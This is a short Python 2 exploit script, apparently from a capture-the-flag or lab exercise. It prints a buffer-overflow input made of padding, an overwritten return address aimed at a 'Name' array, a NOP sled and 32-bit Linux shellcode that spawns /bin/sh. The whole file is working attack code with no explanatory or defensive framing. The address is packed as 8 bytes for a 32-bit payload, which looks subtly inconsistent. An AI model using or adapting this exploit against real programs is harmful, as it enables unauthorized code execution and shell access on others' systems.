#!/usr/bin/python

import struct

padding = "\x41"*48                     #48 * "A" for padding purposes
eip = struct.pack('<Q', 0x080dacf8)     #Address of "Name" array + 4
nops = "\x90"*40                        #40 noops
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding+eip+nops+payload
